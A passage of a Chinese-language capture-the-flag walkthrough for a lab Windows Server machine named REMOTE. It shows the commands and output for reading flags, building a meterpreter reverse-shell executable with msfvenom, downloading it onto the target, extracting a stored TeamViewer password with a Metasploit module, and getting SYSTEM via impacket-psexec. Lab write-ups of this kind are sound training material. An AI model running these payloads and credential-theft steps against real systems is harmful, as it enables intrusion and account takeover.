2/19/2020   3:12 PM                .NET v2.0 Classic                                                     <br>d-----        2/19/2020   3:12 PM                .NET v4.5                                                             <br>d-----        2/19/2020   3:12 PM                .NET v4.5 Classic                                                     <br>d-----         7/9/2021   6:50 AM                Administrator                                                         <br>d-----        2/19/2020   3:12 PM                Classic .NET AppPool                                                  <br>d-r---         1/9/2024   9:48 AM                Public                                                                <br><br><br>PS C:\Users&gt; cd Public<br>PS C:\Users\Public&gt; ls<br><br><br>    Directory: C:\Users\Public<br><br><br>Mode                LastWriteTime         Length Name                                                                  <br>----                -------------         ------ ----                                                                  <br>d-r---         1/9/2024   9:48 AM                Desktop                                                               <br>d-r---        2/19/2020   3:03 PM                Documents                                                             <br>d-r---        9/15/2018   3:19 AM                Downloads                                                             <br>d-r---        9/15/2018   3:19 AM                Music                                                                 <br>d-r---        9/15/2018   3:19 AM                Pictures                                                              <br>d-r---        9/15/2018   3:19 AM                Videos                                                                <br><br><br>PS C:\Users\Public&gt; cd Desktop<br>PS C:\Users\Public\Desktop&gt;<br></code></pre></td></tr></table></figure>
+
+<p>20、获取第一个flag信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">PS C:\Users\Public\Desktop&gt; ls<br><br><br>    Directory: C:\Users\Public\Desktop<br><br><br>Mode                LastWriteTime         Length Name                                                                  <br>----                -------------         ------ ----                                                                  <br>-a----        <span class="hljs-number">2</span>/<span class="hljs-number">20</span>/<span class="hljs-number">2020</span>   <span class="hljs-number">2</span>:<span class="hljs-number">14</span> AM           <span class="hljs-number">1191</span> TeamViewer <span class="hljs-number">7.l</span>nk                                                      <br>-ar---        <span class="hljs-number">3</span>/<span class="hljs-number">16</span>/<span class="hljs-number">2024</span>   <span class="hljs-number">9</span>:<span class="hljs-number">34</span> AM             <span class="hljs-number">34</span> user.txt                                                              <br><br><br>PS C:\Users\Public\Desktop&gt; type user.txt<br>f33a1e79153d44d09c2dee1b8ab162ee<br>PS C:\Users\Public\Desktop&gt; <br></code></pre></td></tr></table></figure>
+
+<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>21、查看下当前用户名和任务进程服务情况</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c">PS C:\Users\Public\Desktop&gt; whoami<br>iis apppool\defaultapppool<br>PS C:\Users\Public\Desktop&gt; tasklist /svc<br><br>Image Name                     PID Services                                    <br>========================= ======== ============================================<br>System Idle Process              <span class="hljs-number">0</span> N/A                                         <br>System                           <span class="hljs-number">4</span> N/A                                         <br>Registry                        <span class="hljs-number">88</span> N/A                                         <br>smss.exe                       <span class="hljs-number">296</span> N/A                                         <br>csrss.exe                      <span class="hljs-number">372</span> N/A                                         <br>wininit.exe                    <span class="hljs-number">480</span> N/A                                         <br>csrss.exe                      <span class="hljs-number">488</span> N/A                                         <br>winlogon.exe                   <span class="hljs-number">544</span> N/A                                         <br>services.exe                   <span class="hljs-number">616</span> N/A                                         <br>lsass.exe                      <span class="hljs-number">636</span> KeyIso, SamSs                               <br>svchost.exe                    <span class="hljs-number">736</span> BrokerInfrastructure, DcomLaunch, LSM,      <br>                                   PlugPlay, Power, SystemEventsBroker         <br>fontdrvhost.exe                <span class="hljs-number">756</span> N/A                                         <br>fontdrvhost.exe                <span class="hljs-number">764</span> N/A                                         <br>svchost.exe                    <span class="hljs-number">844</span> RpcEptMapper, RpcSs                         <br>dwm.exe                        <span class="hljs-number">924</span> N/A                                         <br>svchost.exe                    <span class="hljs-number">968</span> DsmSvc, gpsvc, IKEEXT, iphlpsvc, ProfSvc,   <br>                                   Schedule, SENS, ShellHWDetection, Themes,   <br>                                   UserManager, UsoSvc, Winmgmt, wlidsvc,      <br>                                   WpnService                                  <br>svchost.exe                     <span class="hljs-number">64</span> Dhcp, EventLog, lmhosts, TimeBrokerSvc,     <br>                                   WinHttpAutoProxySvc                         <br>svchost.exe                    <span class="hljs-number">332</span> DsSvc, NcbService, PcaSvc, SysMain, TrkWks, <br>                                   UALSVC                                      <br>svchost.exe                    <span class="hljs-number">364</span> CoreMessagingRegistrar, DPS                 <br>svchost.exe                   <span class="hljs-number">1096</span> CDPSvc, EventSystem, FontCache, netprofm,   <br>                                   nsi, SstpSvc                                <br>vm3dservice.exe               <span class="hljs-number">1104</span> vm3dservice                                 <br>svchost.exe                   <span class="hljs-number">1208</span> CryptSvc, Dnscache, LanmanWorkstation,      <br>                                   NlaSvc, WinRM                               <br>svchost.exe                   <span class="hljs-number">1316</span> Wcmsvc                                      <br>svchost.exe                   <span class="hljs-number">1452</span> BFE, mpssvc                                 <br>svchost.exe                   <span class="hljs-number">1688</span> PolicyAgent                                 <br>spoolsv.exe                   <span class="hljs-number">1380</span> Spooler                                     <br>svchost.exe                   <span class="hljs-number">2060</span> AppHostSvc                                  <br>svchost.exe                   <span class="hljs-number">2076</span> DiagTrack                                   <br>svchost.exe                   <span class="hljs-number">2096</span> ftpsvc                                      <br>inetinfo.exe                  <span class="hljs-number">2124</span> IISADMIN                                    <br>svchost.exe                   <span class="hljs-number">2212</span> W32Time                                     <br>svchost.exe                   <span class="hljs-number">2220</span> W3SVC, WAS                                  <br>vmtoolsd.exe                  <span class="hljs-number">2232</span> VMTools                                     <br>VGAuthService.exe             <span class="hljs-number">2244</span> VGAuthService                               <br>svchost.exe                   <span class="hljs-number">2260</span> LanmanServer                                <br>TeamViewer_Service.exe        <span class="hljs-number">2308</span> TeamViewer7                                 <br>MsMpEng.exe                   <span class="hljs-number">2340</span> WinDefend                                   <br>svchost.exe                   <span class="hljs-number">2372</span> RasMan                                      <br>nfssvc.exe                    <span class="hljs-number">2528</span> NfsService                                  <br>dllhost.exe                   <span class="hljs-number">3128</span> COMSysApp                                   <br>WmiPrvSE.exe                  <span class="hljs-number">3408</span> N/A                                         <br>msdtc.exe                     <span class="hljs-number">3552</span> MSDTC                                       <br>LogonUI.exe                   <span class="hljs-number">4072</span> N/A                                         <br>SearchIndexer.exe             <span class="hljs-number">1784</span> WSearch                                     <br>svchost.exe                   <span class="hljs-number">1132</span> StateRepository                             <br>svchost.exe                   <span class="hljs-number">1628</span> WaaSMedicSvc                                <br>w3wp.exe                      <span class="hljs-number">3452</span> N/A                                         <br>win32calc.exe                 <span class="hljs-number">1704</span> N/A                                         <br>win32calc.exe                 <span class="hljs-number">2916</span> N/A                                         <br>win32calc.exe                 <span class="hljs-number">4808</span> N/A                                         <br>cmd.exe                       <span class="hljs-number">2844</span> N/A                                         <br>conhost.exe                   <span class="hljs-number">1576</span> N/A                                         <br>cmd.exe                       <span class="hljs-number">4172</span> N/A                                         <br>conhost.exe                   <span class="hljs-number">4712</span> N/A                                         <br>powershell.exe                <span class="hljs-number">5048</span> N/A                                         <br>svchost.exe                   <span class="hljs-number">3808</span> ClipSVC                                     <br>tasklist.exe                   <span class="hljs-number">700</span> N/A                                         <br>PS C:\Users\Public\Desktop&gt; <br></code></pre></td></tr></table></figure>
+
+<p>22、这里都出现了 TeamViewer7 ，继续看一下系统信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c">PS C:\Users\Public\Desktop&gt; systeminfo<br><br>Host Name:                 REMOTE<br>OS Name:                   Microsoft Windows Server <span class="hljs-number">2019</span> Standard<br>OS Version:                <span class="hljs-number">10.0</span><span class="hljs-number">.17763</span> N/A Build <span class="hljs-number">17763</span><br>OS Manufacturer:           Microsoft Corporation<br>OS Configuration:          Standalone Server<br>OS Build Type:             Multiprocessor Free<br>Registered Owner:          Windows User<br>Registered Organization:   <br>Product ID:                <span class="hljs-number">00429</span><span class="hljs-number">-00521</span><span class="hljs-number">-62775</span>-AA801<br>Original Install Date:     <span class="hljs-number">2</span>/<span class="hljs-number">19</span>/<span class="hljs-number">2020</span>, <span class="hljs-number">4</span>:<span class="hljs-number">03</span>:<span class="hljs-number">29</span> PM<br>System Boot Time:          <span class="hljs-number">3</span>/<span class="hljs-number">16</span>/<span class="hljs-number">2024</span>, <span class="hljs-number">9</span>:<span class="hljs-number">33</span>:<span class="hljs-number">47</span> AM<br>System Manufacturer:       VMware, Inc.<br>System Model:              VMware7,<span class="hljs-number">1</span><br>System Type:               x64-based PC<br><span class="hljs-title function_">Processor</span><span class="hljs-params">(s)</span>:              2 <span class="hljs-title function_">Processor</span><span class="hljs-params">(s)</span> Installed.<br>                           [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2295 Mhz<br>                           [02]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2295 Mhz<br>BIOS Version:              VMware, Inc. VMW71.00V.16707776.B64.2008070230, 8/7/2020<br>Windows Directory:         C:\Windows<br>System Directory:          C:\Windows\system32<br>Boot Device:               \Device\HarddiskVolume2<br>System Locale:             en-us;English (United States)<br>Input Locale:              en-us;English (United States)<br>Time Zone:                 (UTC<span class="hljs-number">-05</span>:<span class="hljs-number">00</span>) Eastern <span class="hljs-title function_">Time</span> <span class="hljs-params">(US &amp; Canada)</span><br>Total Physical Memory:     2,047 MB<br>Available Physical Memory: 813 MB<br>Virtual Memory: Max Size:  2,431 MB<br>Virtual Memory: Available: 1,287 MB<br>Virtual Memory: In Use:    1,144 MB<br>Page File <span class="hljs-title function_">Location</span><span class="hljs-params">(s)</span>:     C:\pagefile.sys<br>Domain:                    WORKGROUP<br>Logon Server:              N/A<br><span class="hljs-title function_">Hotfix</span><span class="hljs-params">(s)</span>:                 4 <span class="hljs-title function_">Hotfix</span><span class="hljs-params">(s)</span> Installed.<br>                           [01]: KB4534119<br>                           [02]: KB4516115<br>                           [03]: KB4523204<br>                           [04]: KB4464455<br>Network <span class="hljs-title function_">Card</span><span class="hljs-params">(s)</span>:           1 <span class="hljs-title function_">NIC</span><span class="hljs-params">(s)</span> Installed.<br>                           [01]: vmxnet3 Ethernet Adapter<br>                                 Connection Name: Ethernet0 2<br>                                 DHCP Enabled:    No<br>                                 IP <span class="hljs-title function_">address</span><span class="hljs-params">(es)</span><br>                                 [01]: 10.10.10.180<br>                                 [02]: fe80::29a0:a9bd:5eac:de7b<br>                                 [03]: dead:beef::29a0:a9bd:5eac:de7b<br>                                 [04]: dead:beef::24e<br>Hyper-V Requirements:      A hypervisor has been detected. Features required <span class="hljs-keyword">for</span> Hyper-V will not be displayed.<br>PS C:\Users\Public\Desktop&gt; <br></code></pre></td></tr></table></figure>
+
+<p>23、继续查一下TeamViewer的版本信息，是不是版本号7</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">PS C:\Users\Public\Desktop&gt; <br>PS C:\Users\Public\Desktop&gt; (Get-Command <span class="hljs-string">&quot;C:\Program Files (x86)\TeamViewer\Version7\TeamViewer.exe&quot;</span>).Version<br><br>Major  Minor  Build  Revision<br>-----  -----  -----  --------<br><span class="hljs-number">7</span>      <span class="hljs-number">0</span>      <span class="hljs-number">0</span>      <span class="hljs-number">0</span>       <br><br><br>PS C:\Users\Public\Desktop&gt; <br></code></pre></td></tr></table></figure>
+
+<p>24、这里有两个思路，一个是使用msf的直接加载teamviever的漏洞提权，一个是使用烂土豆，我们使用msf的进行提权，简单快捷</p>
+<p>25、生成一个反弹shell的exe执行文件</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.8</span> LPORT=<span class="hljs-number">4444</span> -f exe -o reverse.exe<br>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload<br>[-] No arch selected, selecting arch: x64 from the payload<br>No encoder specified, outputting raw payload<br>Payload size: <span class="hljs-number">510</span> bytes<br>Final size of exe file: <span class="hljs-number">7168</span> bytes<br>Saved as: reverse.exe<br></code></pre></td></tr></table></figure>
+
+<p>26、下载到目标靶机上面</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ python3 -m http.server <span class="hljs-number">8000</span><br>Serving HTTP on <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> port <span class="hljs-number">8000</span> (http:<span class="hljs-comment">//0.0.0.0:8000/) ...</span><br><span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.180</span> - - [<span class="hljs-number">16</span>/Mar/<span class="hljs-number">2024</span> <span class="hljs-number">22</span>:<span class="hljs-number">41</span>:<span class="hljs-number">01</span>] <span class="hljs-string">&quot;GET /reverse.exe HTTP/1.1&quot;</span> <span class="hljs-number">200</span> -<br><br><br>PS C:\Users\Public&gt; cd Downloads<br>PS C:\Users\Public\Downloads&gt; ls<br>PS C:\Users\Public\Downloads&gt; iwr -uri http:<span class="hljs-comment">//10.10.14.8:8000/reverse.exe -Outfile reverse.exe</span><br>PS C:\Users\Public\Downloads&gt; dir<br><br><br>    Directory: C:\Users\Public\Downloads<br><br><br>Mode                LastWriteTime         Length Name                                                                  <br>----                -------------         ------ ----                                                                  <br>-a----        <span class="hljs-number">3</span>/<span class="hljs-number">16</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">10</span>:<span class="hljs-number">41</span> AM           <span class="hljs-number">7168</span> reverse.exe                                                           <br><br><br>PS C:\Users\Public\Downloads&gt; <br></code></pre></td></tr></table></figure>
+
+<p>27、启动msf</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ msfconsole                                                                                      <br>Metasploit tip: You can pivot connections over sessions started with the <br>ssh_login modules<br>msf6 &gt; use exploit/multi/handler<br>[*] Using configured payload generic/shell_reverse_tcp<br>msf6 <span class="hljs-title function_">exploit</span><span class="hljs-params">(multi/handler)</span> &gt; <span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp<br>payload =&gt; windows/x64/meterpreter/reverse_tcp<br>msf6 <span class="hljs-title function_">exploit</span><span class="hljs-params">(multi/handler)</span> &gt; <span class="hljs-built_in">set</span> LPORT 4444<br>LPORT =&gt; <span class="hljs-number">4444</span><br>msf6 <span class="hljs-title function_">exploit</span><span class="hljs-params">(multi/handler)</span> &gt; <span class="hljs-built_in">set</span> LHOST 0.0.0.0<br>LHOST =&gt; <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><br>msf6 <span class="hljs-title function_">exploit</span><span class="hljs-params">(multi/handler)</span> &gt; <span class="hljs-built_in">set</span> ExitOnSession <span class="hljs-literal">false</span><br>ExitOnSession =&gt; <span class="hljs-literal">false</span><br>msf6 <span class="hljs-title function_">exploit</span><span class="hljs-params">(multi/handler)</span> &gt; exploit -j<br>[*] Exploit running as background job 0.<br>[*] Exploit completed, but no session was created.<br>msf6 <span class="hljs-title function_">exploit</span><span class="hljs-params">(multi/handler)</span> &gt; <br>[*] Started reverse TCP handler on 0.0.0.0:4444 <br></code></pre></td></tr></table></figure>
+
+<p>28、开始进行msf提权利用</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c">msf6 <span class="hljs-title function_">exploit</span><span class="hljs-params">(multi/handler)</span> &gt; <br>[*] Started reverse TCP handler on 0.0.0.0:4444 <br>[*] Sending <span class="hljs-title function_">stage</span> <span class="hljs-params">(<span class="hljs-number">200774</span> bytes)</span> to 10.10.10.180<br>[*] Meterpreter session 1 <span class="hljs-title function_">opened</span> <span class="hljs-params">(<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.8</span>:<span class="hljs-number">4444</span> -&gt; <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.180</span>:<span class="hljs-number">49714</span>)</span> at 2024-03-16 22:42:34 +0800<br><br>msf6 <span class="hljs-title function_">exploit</span><span class="hljs-params">(multi/handler)</span> &gt; sessions <br><br>Active sessions<br>===============<br><br>  Id  Name  Type                     Information                          Connection<br>  --  ----  ----                     -----------                          ----------<br>  <span class="hljs-number">1</span>         meterpreter x64/windows  IIS APPPOOL\DefaultAppPool @ REMOTE  <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.8</span>:<span class="hljs-number">4444</span> -&gt; <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.180</span>:<span class="hljs-number">497</span><br>                                                                          <span class="hljs-number">14</span> (<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.180</span>)<br><br>msf6 exploit(multi/handler) &gt; <br><br>msf6 exploit(multi/handler) &gt; search TeamViewer<br><br>Matching Modules<br>================<br><br>   #  Name                                                  Disclosure Date  Rank    Check  Description<br>   -  ----                                                  ---------------  ----    -----  -----------<br>   <span class="hljs-number">0</span>  auxiliary/server/teamviewer_uri_smb_redirect                           normal  No     TeamViewer Unquoted URI Handler SMB Redirect<br>   <span class="hljs-number">1</span>  post/windows/gather/credentials/teamviewer_passwords                   normal  No     Windows Gather TeamViewer Passwords                                                                                               <br><br><br>Interact with a module by name or index. For example info <span class="hljs-number">1</span>, use <span class="hljs-number">1</span> or use post/windows/gather/credentials/teamviewer_passwords                                                                                                <br><br>msf6 exploit(multi/handler) &gt; use <span class="hljs-number">1</span><br>msf6 post(windows/gather/credentials/teamviewer_passwords) &gt; show options<br><br>Module options (post/windows/gather/credentials/teamviewer_passwords):<br><br>   Name          Current Setting  Required  Description<br>   ----          ---------------  --------  -----------<br>   SESSION                        yes       The session to run this module on<br>   WINDOW_TITLE  TeamViewer       no        Specify a title <span class="hljs-keyword">for</span> getting the window handle, e.g. TeamViewer<br><br><br>View the full module info with the info, or info -d command.<br><br>msf6 post(windows/gather/credentials/teamviewer_passwords) &gt; <span class="hljs-built_in">set</span> SESSION <span class="hljs-number">1</span><br>SESSION =&gt; <span class="hljs-number">1</span><br>msf6 post(windows/gather/credentials/teamviewer_passwords) &gt; run<br><br>[*] Finding TeamViewer Passwords on REMOTE<br>[+] Found Unattended Password: !R3m0te!<br>[+] Passwords stored in: /home/kali/.msf4/loot/<span class="hljs-number">20240316224650</span>_default_10<span class="hljs-number">.10</span><span class="hljs-number">.10</span><span class="hljs-number">.180</span>_host.teamviewer__314338.txt<br>[*] &lt;---------------- | Using Window Technique | ----------------&gt;<br>[*] TeamViewer<span class="hljs-number">&#x27;</span>s language setting options are <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-string">[*] TeamViewer&#x27;</span>s version is <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-string">[-] Unable to find TeamViewer&#x27;</span>s process<br>[*] Post module execution completed<br>msf6 post(windows/gather/credentials/teamviewer_passwords) &gt; <br></code></pre></td></tr></table></figure>
+
+<p>29、查看本次获取到的密码信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">administrator<br><br>!R3m0te!<br></code></pre></td></tr></table></figure>
+
+<p>30、开启psexec，拿到最终flag信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ impacket-psexec Administrator@<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.180</span><br>Impacket v0<span class="hljs-number">.11</span><span class="hljs-number">.0</span> - Copyright <span class="hljs-number">2023</span> Fortra<br><br>Password:<br>[*] Requesting shares on <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.180</span>.....<br>[*] Found writable share ADMIN$<br>[*] Uploading file sbEiloUw.exe<br>[*] Opening SVCManager on <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.180</span>.....<br>[*] Creating service sCuK on <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.180</span>.....<br>[*] Starting service sCuK.....<br>[!] Press help <span class="hljs-keyword">for</span> extra shell commands<br>Microsoft Windows [Version <span class="hljs-number">10.0</span><span class="hljs-number">.17763</span><span class="hljs-number">.107</span>]<br>(c) <span class="hljs-number">2018</span> Microsoft Corporation. All rights reserved.<br><br>C:\Windows\system32&gt; whoami<br>nt authority\system<br><br>C:\Windows\system32&gt; cd C:/Users/Administrator<br> <br>C:\Users\Administrator&gt; cd Desktop<br> <br>C:\Users\Administrator\Desktop&gt; type root.txt<br>ce97750dd34949048b839958825ff45d<br><br>C:\Users\Administrator\Desktop&gt; <br></code></pre></td></tr></table></figure>
+
+<p><strong>附录：</strong></p>
+<p>土豆提权一览：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span 